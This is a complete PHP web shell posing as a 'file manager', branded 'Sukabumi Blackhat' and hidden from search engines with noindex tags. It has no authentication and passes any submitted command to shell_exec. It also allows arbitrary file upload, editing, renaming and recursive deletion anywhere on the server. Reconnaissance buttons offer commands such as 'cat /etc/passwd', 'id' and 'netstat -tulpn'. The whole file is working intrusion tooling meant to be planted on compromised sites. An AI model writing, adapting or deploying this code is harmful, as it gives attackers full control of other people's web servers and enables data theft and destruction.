<?php
// Mr. SpongeBob Ganteng File Manager with Terminal
$current_dir = isset($_GET['dir']) ? $_GET['dir'] : '.';
$current_dir = realpath($current_dir);

// Handle terminal command execution
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['exec_cmd'])) {
    $cmd = trim($_POST['command']);
    $exec_dir = isset($_POST['exec_dir']) ? $_POST['exec_dir'] : $current_dir;
    
    if (!empty($cmd)) {
        // Change directory in PHP and execute command
        $old_dir = getcwd();
        chdir($exec_dir);
        
        ob_start();
        $output = shell_exec($cmd . " 2>&1");
        ob_end_clean();
        
        chdir($old_dir); // Return to original directory
        
        $terminal_output = $output ? $output : "(no output)";
        $last_command = $cmd;
    }
}

// Handle create new file
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create_file'])) {
    $new_file = $current_dir . DIRECTORY_SEPARATOR . $_POST['new_filename'];
    if (!file_exists($new_file)) {
        if (file_put_contents($new_file, '') !== false) {
            $message = "File baru berhasil dibuat!";
            $msg_type = "success";
        } else {
            $message = "Gagal membuat file.";
            $msg_type = "error";
        }
    } else {
        $message = "File sudah ada!";
        $msg_type = "error";
    }
}

// Handle create new folder
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create_folder'])) {
    $new_folder = $current_dir . DIRECTORY_SEPARATOR . $_POST['new_foldername'];
    if (!file_exists($new_folder)) {
        if (mkdir($new_folder, 0755, true)) {
            $message = "Folder baru berhasil dibuat!";
            $msg_type = "success";
        } else {
            $message = "Gagal membuat folder.";
            $msg_type = "error";
        }
    } else {
        $message = "Folder sudah ada!";
        $msg_type = "error";
    }
}

// Handle rename
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['rename_item'])) {
    $old_path = $_POST['old_path'];
    $new_name = trim($_POST['new_name']);

    if ($old_path && $new_name) {
        $old_real = realpath($old_path);
        if ($old_real && file_exists($old_real)) {
            $new_path = dirname($old_real) . DIRECTORY_SEPARATOR . basename($new_name);

            if (file_exists($new_path)) {
                $message = "âŒ Nama sudah dipakai!";
                $msg_type = "error";
            } elseif (rename($old_real, $new_path)) {
                $message = "âœ… Berhasil direname!";
                $msg_type = "success";
            } else {
                $message = "âŒ Gagal rename (cek permission).";
                $msg_type = "error";
            }
        } else {
            $message = "âŒ File/folder tidak ditemukan!";
            $msg_type = "error";
        }
    } else {
        $message = "âŒ Input tidak valid.";
        $msg_type = "error";
    }
}

// Handle file edit/save
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['edit_file'])) {
    $file_to_edit = realpath($_POST['file_path']);
    if (file_exists($file_to_edit)) {
        if (file_put_contents($file_to_edit, $_POST['file_content'])) {
            $message = "File berhasil disimpan!";
            $msg_type = "success";
        } else {
            $message = "Gagal menyimpan file.";
            $msg_type = "error";
        }
    }
}

// Handle file upload
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    $upload_errors = array(
        UPLOAD_ERR_OK => 'File berhasil diupload!',
        UPLOAD_ERR_INI_SIZE => 'File terlalu besar (melebihi upload_max_filesize)',
        UPLOAD_ERR_FORM_SIZE => 'File terlalu besar (melebihi MAX_FILE_SIZE)',
        UPLOAD_ERR_PARTIAL => 'File hanya terupload sebagian',
        UPLOAD_ERR_NO_FILE => 'Tidak ada file yang diupload',
        UPLOAD_ERR_NO_TMP_DIR => 'Folder temporary tidak ditemukan',
        UPLOAD_ERR_CANT_WRITE => 'Gagal menulis file ke disk',
        UPLOAD_ERR_EXTENSION => 'Upload dihentikan oleh extension'
    );
    
    $error_code = $_FILES['file']['error'];
    
    if ($error_code === UPLOAD_ERR_OK) {
        $target_dir = $current_dir . DIRECTORY_SEPARATOR;
        $target_file = $target_dir . basename($_FILES['file']['name']);
        
        if (!is_writable($current_dir)) {
            $message = "Folder tidak memiliki permission write! Path: " . $current_dir;
            $msg_type = "error";
        } elseif (file_exists($target_file)) {
            if (move_uploaded_file($_FILES['file']['tmp_name'], $target_file)) {
                $message = "File berhasil diupload (overwrite)!";
                $msg_type = "success";
            } else {
                $message = "Gagal mengupload file.";
                $msg_type = "error";
            }
        } else {
            if (move_uploaded_file($_FILES['file']['tmp_name'], $target_file)) {
                $message = "File berhasil diupload!";
                $msg_type = "success";
            } else {
                $message = "Gagal mengupload file.";
                $msg_type = "error";
            }
        }
    } else {
        $message = "Upload Error: " . (isset($upload_errors[$error_code]) ? $upload_errors[$error_code] : "Unknown error");
        $msg_type = "error";
    }
}

// Handle file/folder deletion
if (isset($_GET['delete'])) {
    $item_to_delete = realpath($_GET['delete']);
    if (file_exists($item_to_delete)) {
        if (is_dir($item_to_delete)) {
            // Delete directory recursively
            if (deleteDirectory($item_to_delete)) {
                $message = "Folder berhasil dihapus!";
                $msg_type = "success";
            } else {
                $message = "Gagal menghapus folder.";
                $msg_type = "error";
            }
        } else {
            // Delete file
            if (unlink($item_to_delete)) {
                $message = "File berhasil dihapus!";
                $msg_type = "success";
            } else {
                $message = "Gagal menghapus file.";
                $msg_type = "error";
            }
        }
    } else {
        $message = "File/folder tidak ditemukan.";
        $msg_type = "error";
    }
}

// Get files and directories
$files = scandir($current_dir);

// Separate folders and files
$folders = array();
$regular_files = array();

foreach ($files as $file) {
    if ($file === '.' || $file === '..') continue;
    $file_path = $current_dir . '/' . $file;
    if (is_dir($file_path)) {
        $folders[] = $file;
    } else {
        $regular_files[] = $file;
    }
}

// Sort alphabetically
sort($folders);
sort($regular_files);

// Check if editing a file
$editing_file = isset($_GET['edit']) ? realpath($_GET['edit']) : null;
$file_content = '';
if ($editing_file && file_exists($editing_file) && is_file($editing_file)) {
    $file_content = file_get_contents($editing_file);
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="robots" content="noindex, nofollow">

    <meta name="googlebot" content="noindex, nofollow">

    <meta name="description" content="Sukabumi Blackhat">

    <link rel="icon" href="https://tools.sukabumiblackhat.com/es.jpg">

    <title>Mr. SpongeBob Ganteng File Manager</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #f5f5f5;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            overflow: hidden;
        }
        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 20px;
        }
        .header h1 {
            font-size: 24px;
            margin-bottom: 10px;
        }
        .current-path {
            background: rgba(255,255,255,0.2);
            padding: 10px;
            border-radius: 4px;
            font-family: monospace;
            word-break: break-all;
        }
        .breadcrumb {
            display: flex;
            flex-wrap: wrap;
            gap: 5px;
            align-items: center;
            margin-top: 10px;
        }
        .breadcrumb a {
            color: white;
            text-decoration: none;
            padding: 5px 10px;
            background: rgba(255,255,255,0.2);
            border-radius: 4px;
            transition: all 0.3s;
        }
        .breadcrumb a:hover {
            background: rgba(255,255,255,0.3);
            transform: translateY(-2px);
        }
        .breadcrumb span {
            color: rgba(255,255,255,0.6);
        }
        .terminal-section {
            padding: 20px;
            background: #1e1e1e;
            border-bottom: 2px solid #667eea;
        }
        .terminal-header {
            color: #4ec9b0;
            font-family: monospace;
            margin-bottom: 10px;
            font-size: 14px;
        }
        .terminal-form {
            display: flex;
            gap: 10px;
            margin-bottom: 15px;
        }
        .terminal-input {
            flex: 1;
            padding: 10px;
            background: #2d2d2d;
            border: 1px solid #3e3e3e;
            color: #d4d4d4;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            border-radius: 4px;
        }
        .terminal-input:focus {
            outline: none;
            border-color: #667eea;
        }
        .btn-exec {
            background: #4ec9b0;
            color: #1e1e1e;
            font-weight: bold;
        }
        .btn-exec:hover {
            background: #3fb89f;
        }
        .terminal-output {
            background: #0c0c0c;
            border: 1px solid #3e3e3e;
            border-radius: 4px;
            padding: 15px;
            color: #cccccc;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            line-height: 1.5;
            max-height: 400px;
            overflow-y: auto;
            white-space: pre-wrap;
            word-wrap: break-word;
        }
        .terminal-output::-webkit-scrollbar {
            width: 8px;
        }
        .terminal-output::-webkit-scrollbar-track {
            background: #1e1e1e;
        }
        .terminal-output::-webkit-scrollbar-thumb {
            background: #3e3e3e;
            border-radius: 4px;
        }
        .terminal-prompt {
            color: #4ec9b0;
            margin-bottom: 5px;
        }
        .upload-section {
            padding: 20px;
            background: #f9f9f9;
            border-bottom: 1px solid #e0e0e0;
        }
        .upload-form {
            display: flex;
            gap: 10px;
            align-items: center;
        }
        .file-input {
            flex: 1;
            padding: 10px;
            border: 2px solid #ddd;
            border-radius: 4px;
            cursor: pointer;
        }
        .btn {
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-weight: bold;
            transition: all 0.3s;
        }
        .btn-upload {
            background: #667eea;
            color: white;
        }
        .btn-upload:hover {
            background: #5568d3;
        }
        .message {
            padding: 15px;
            margin: 20px;
            border-radius: 4px;
            font-weight: bold;
        }
        .success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        .error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        .file-list {
            padding: 20px;
        }
        .file-item {
            display: flex;
            align-items: center;
            padding: 12px;
            border-bottom: 1px solid #f0f0f0;
            transition: background 0.2s;
        }
        .file-item:hover {
            background: #f9f9f9;
        }
        .file-icon {
            width: 40px;
            height: 40px;
            margin-right: 15px;
            font-size: 24px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .file-info {
            flex: 1;
        }
        .file-name {
            font-weight: 500;
            color: #333;
        }
        .file-size {
            font-size: 12px;
            color: #999;
            margin-top: 4px;
        }
        .file-actions {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
        }
        .btn-small {
            padding: 6px 12px;
            font-size: 12px;
            text-decoration: none;
            border-radius: 4px;
        }
        .btn-delete {
            background: #ff4757;
            color: white;
        }
        .btn-delete:hover {
            background: #e63946;
        }
        .editor-container {
            padding: 20px;
            background: #f9f9f9;
        }
        .editor-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
        }
        .editor-title {
            font-size: 18px;
            font-weight: bold;
            color: #333;
        }
        .btn-back {
            background: #95a5a6;
            color: white;
        }
        .btn-back:hover {
            background: #7f8c8d;
        }
        .btn-save {
            background: #27ae60;
            color: white;
        }
        .btn-save:hover {
            background: #229954;
        }
        textarea.code-editor {
            width: 100%;
            height: 500px;
            padding: 15px;
            border: 2px solid #ddd;
            border-radius: 4px;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            line-height: 1.5;
            resize: vertical;
            background: #282c34;
            color: #abb2bf;
        }
        .btn-edit {
            background: #3498db;
            color: white;
        }
        .btn-edit:hover {
            background: #2980b9;
        }
        .create-section {
            padding: 20px;
            background: #fff;
            border-bottom: 1px solid #e0e0e0;
            display: flex;
            gap: 20px;
            flex-wrap: wrap;
        }
        .create-form {
            display: flex;
            gap: 10px;
            align-items: center;
            flex: 1;
            min-width: 300px;
        }
        .text-input {
            flex: 1;
            padding: 10px;
            border: 2px solid #ddd;
            border-radius: 4px;
            font-size: 14px;
        }
        .btn-create {
            background: #f39c12;
            color: white;
        }
        .btn-create:hover {
            background: #e67e22;
        }
        .btn-rename {
            background: #9b59b6;
            color: white;
        }
        .btn-rename:hover {
            background: #8e44ad;
        }
        .modal {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.5);
        }
        .modal-content {
            background: white;
            margin: 15% auto;
            padding: 20px;
            border-radius: 8px;
            width: 400px;
            max-width: 90%;
        }
        .modal-header {
            font-size: 18px;
            font-weight: bold;
            margin-bottom: 15px;
        }
        .modal-body {
            margin-bottom: 15px;
        }
        .modal-footer {
            display: flex;
            gap: 10px;
            justify-content: flex-end;
        }
        .btn-cancel {
            background: #95a5a6;
            color: white;
        }
        .btn-cancel:hover {
            background: #7f8c8d;
        }
        .quick-commands {
            display: flex;
            gap: 5px;
            flex-wrap: wrap;
            margin-bottom: 10px;
        }
        .quick-cmd-btn {
            padding: 5px 10px;
            background: #3e3e3e;
            color: #d4d4d4;
            border: 1px solid #555;
            border-radius: 3px;
            cursor: pointer;
            font-size: 11px;
            font-family: monospace;
        }
        .quick-cmd-btn:hover {
            background: #4e4e4e;
        }
        .terminal-info {
            color: #4ec9b0;
            font-size: 11px;
            margin-top: 5px;
            font-family: monospace;
        }
    </style>
</head>
<body>
    <script>
function openRenameModal(oldPath, oldName) {
    document.getElementById("oldPath").value = oldPath;
    document.getElementById("newName").value = oldName;
    document.getElementById("renameModal").style.display = "flex";
}
function closeRenameModal() {
    document.getElementById("renameModal").style.display = "none";
}
window.onclick = function(event) {
    let modal = document.getElementById("renameModal");
    if (event.target === modal) {
        modal.style.display = "none";
    }
}
function insertCommand(cmd) {
    document.getElementById("terminalInput").value = cmd;
    document.getElementById("terminalInput").focus();
}
</script>

    <!-- Rename Modal -->
    <div id="renameModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">âœï¸ Rename Item</div>
            <form method="POST" id="renameForm">
                <div class="modal-body">
                    <input type="hidden" name="old_path" id="oldPath">
                    <input type="text" name="new_name" id="newName" class="text-input" placeholder="Nama baru..." required>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-small btn-cancel" onclick="closeRenameModal()">Cancel</button>
                    <button type="submit" name="rename_item" class="btn btn-small btn-rename">âœ“ Rename</button>
                </div>
            </form>
        </div>
    </div>

    <div class="container">
        <div class="header">
            <h1>ðŸ§½ Mr. SpongeBob Ganteng File Manager</h1>
            <div class="current-path">
                <strong>Current Directory:</strong>
                <div class="breadcrumb">
                    <?php
                    $path_parts = explode(DIRECTORY_SEPARATOR, $current_dir);
                    $path_build = '';
                    foreach ($path_parts as $index => $part) {
                        if (empty($part)) continue;
                        $path_build .= DIRECTORY_SEPARATOR . $part;
                        if ($index < count($path_parts) - 1) {
                            echo '<a href="?dir=' . urlencode($path_build) . '">' . htmlspecialchars($part) . '</a>';
                            echo '<span>/</span>';
                        } else {
                            echo '<strong style="color: white;">' . htmlspecialchars($part) . '</strong>';
                        }
                    }
                    ?>
                </div>
            </div>
        </div>

        <!-- Terminal Section -->
        <div class="terminal-section">
            <div class="terminal-header">ðŸ–¥ï¸ Terminal - Working Directory: <?php echo htmlspecialchars($current_dir); ?></div>
            
            <div class="quick-commands">
                <button class="quick-cmd-btn" onclick="insertCommand('ls -lah')">ls -lah</button>
                <button class="quick-cmd-btn" onclick="insertCommand('pwd')">pwd</button>
                <button class="quick-cmd-btn" onclick="insertCommand('whoami')">whoami</button>
                <button class="quick-cmd-btn" onclick="insertCommand('id')">id</button>
                <button class="quick-cmd-btn" onclick="insertCommand('uname -a')">uname -a</button>
                <button class="quick-cmd-btn" onclick="insertCommand('cat /etc/passwd')">cat /etc/passwd</button>
                <button class="quick-cmd-btn" onclick="insertCommand('ps aux')">ps aux</button>
                <button class="quick-cmd-btn" onclick="insertCommand('netstat -tulpn')">netstat -tulpn</button>
            </div>
            
            <form method="POST" class="terminal-form">
                <input type="hidden" name="exec_dir" value="<?php echo htmlspecialchars($current_dir); ?>">
                <input type="text" name="command" id="terminalInput" class="terminal-input" placeholder="Enter command here... (akan dijalankan di direktori: <?php echo htmlspecialchars($current_dir); ?>)" autocomplete="off" value="<?php echo isset($last_command) ? htmlspecialchars($last_command) : ''; ?>">
                <button type="submit" name="exec_cmd" class="btn btn-exec">â–¶ Execute</button>
            </form>
            
            <?php if (isset($terminal_output)): ?>
            <div class="terminal-output">
<div class="terminal-prompt">$ <?php echo htmlspecialchars($last_command); ?></div><?php echo htmlspecialchars($terminal_output); ?></div>
            <?php endif; ?>
        </div>

        <div class="create-section">
            <form method="POST" class="create-form">
                <input type="text" name="new_filename" class="text-input" placeholder="nama-file.txt" required>
                <button type="submit" name="create_file" class="btn btn-create">ðŸ“ New File</button>
            </form>
            <form method="POST" class="create-form">
                <input type="text" name="new_foldername" class="text-input" placeholder="nama-folder" required>
                <button type="submit" name="create_folder" class="btn btn-create">ðŸ“ New Folder</button>
            </form>
        </div>

        <div class="upload-section">
            <form method="POST" enctype="multipart/form-data" class="upload-form">
                <input type="file" name="file" class="file-input" required>
                <button type="submit" class="btn btn-upload">ðŸ“¤ Upload File</button>
            </form>
            <div style="margin-top: 10px; font-size: 12px; color: #666;">
                <strong>Upload Info:</strong> 
                Max size: <?php echo ini_get('upload_max_filesize'); ?> | 
                Post max: <?php echo ini_get('post_max_size'); ?> | 
                Writable: <?php echo is_writable($current_dir) ? 'âœ“ Yes' : 'âœ— No'; ?>
            </div>
        </div>

        <?php if (isset($message)): ?>
            <div class="message <?php echo $msg_type; ?>">
                <?php echo $message; ?>
            </div>
        <?php endif; ?>

        <?php if ($editing_file): ?>
            <!-- Editor Mode -->
            <div class="editor-container">
                <div class="editor-header">
                    <div class="editor-title">âœï¸ Editing: <?php echo htmlspecialchars(basename($editing_file)); ?></div>
                    <a href="?dir=<?php echo urlencode($current_dir); ?>" class="btn btn-small btn-back">â† Back to Files</a>
                </div>
                <form method="POST">
                    <input type="hidden" name="file_path" value="<?php echo htmlspecialchars($editing_file); ?>">
                    <textarea name="file_content" class="code-editor"><?php echo htmlspecialchars($file_content); ?></textarea>
                    <div style="margin-top: 15px;">
                        <button type="submit" name="edit_file" class="btn btn-save">ðŸ’¾ Save File</button>
                    </div>
                </form>
            </div>
        <?php else: ?>
            <!-- File List Mode -->

        <div class="file-list">
            <?php if ($current_dir !== realpath('/')): ?>
                <div class="file-item">
                    <div class="file-icon">ðŸ“</div>
                    <div class="file-info">
                        <div class="file-name">
                            <a href="?dir=<?php echo urlencode(dirname($current_dir)); ?>" style="color: #667eea; text-decoration: none;">
                                <strong>.. (Parent Directory)</strong>
                            </a>
                        </div>
                    </div>
                </div>
            <?php endif; ?>
            
            <?php
            // Display folders first
            foreach ($folders as $folder):
                $file_path = $current_dir . '/' . $folder;
            ?>
                <div class="file-item">
                    <div class="file-icon">ðŸ“</div>
                    <div class="file-info">
                        <div class="file-name">
                            <a href="?dir=<?php echo urlencode($file_path); ?>" style="color: #667eea; text-decoration: none;">
                                <?php echo htmlspecialchars($folder); ?>
                            </a>
                        </div>
                        <div class="file-size">-</div>
                    </div>
                    <div class="file-actions">
                        <button type="button" class="btn btn-small btn-rename" onclick="openRenameModal('<?php echo htmlspecialchars($file_path, ENT_QUOTES); ?>', '<?php echo htmlspecialchars($folder, ENT_QUOTES); ?>')">âœï¸ Rename</button>
                        <a href="?dir=<?php echo urlencode($current_dir); ?>&delete=<?php echo urlencode($file_path); ?>" 
                           class="btn btn-small btn-delete" 
                           onclick="return confirm('Yakin ingin menghapus folder ini?')">ðŸ—‘ï¸ Delete</a>
                    </div>
                </div>
            <?php endforeach; ?>
            
            <?php
            // Then display files
            foreach ($regular_files as $file):
                $file_path = $current_dir . '/' . $file;
                $file_size = formatSize(filesize($file_path));
            ?>
                <div class="file-item">
                    <div class="file-icon">ðŸ“„</div>
                    <div class="file-info">
                        <div class="file-name">
                            <?php echo htmlspecialchars($file); ?>
                        </div>
                        <div class="file-size"><?php echo $file_size; ?></div>
                    </div>
                    <div class="file-actions">
                        <button type="button" class="btn btn-small btn-rename" onclick="openRenameModal('<?php echo htmlspecialchars($file_path, ENT_QUOTES); ?>', '<?php echo htmlspecialchars($file, ENT_QUOTES); ?>')">âœï¸ Rename</button>
                        <a href="?dir=<?php echo urlencode($current_dir); ?>&edit=<?php echo urlencode($file_path); ?>" 
                           class="btn btn-small btn-edit">ðŸ“ Edit</a>
                        <a href="<?php echo htmlspecialchars($file); ?>" class="btn btn-small" style="background: #2ecc71; color: white;" download>â¬‡ï¸ Download</a>
                        <a href="?dir=<?php echo urlencode($current_dir); ?>&delete=<?php echo urlencode($file_path); ?>" 
                           class="btn btn-small btn-delete" 
                           onclick="return confirm('Yakin ingin menghapus file ini?')">ðŸ—‘ï¸ Delete</a>
                    </div>
                </div>
            <?php endforeach; ?>
        </div>
        <?php endif; ?>
    </div>
</body>
</html>

<?php
function formatSize($bytes) {
    $units = ['B', 'KB', 'MB', 'GB'];
    $i = 0;
    while ($bytes >= 1024 && $i < count($units) - 1) {
        $bytes /= 1024;
        $i++;
    }
    return round($bytes, 2) . ' ' . $units[$i];
}

function deleteDirectory($dir) {
    if (!file_exists($dir)) {
        return true;
    }
    
    if (!is_dir($dir)) {
        return unlink($dir);
    }
    
    foreach (scandir($dir) as $item) {
        if ($item == '.' || $item == '..') {
            continue;
        }
        
        if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) {
            return false;
        }
    }
    
    return rmdir($dir);
}
?>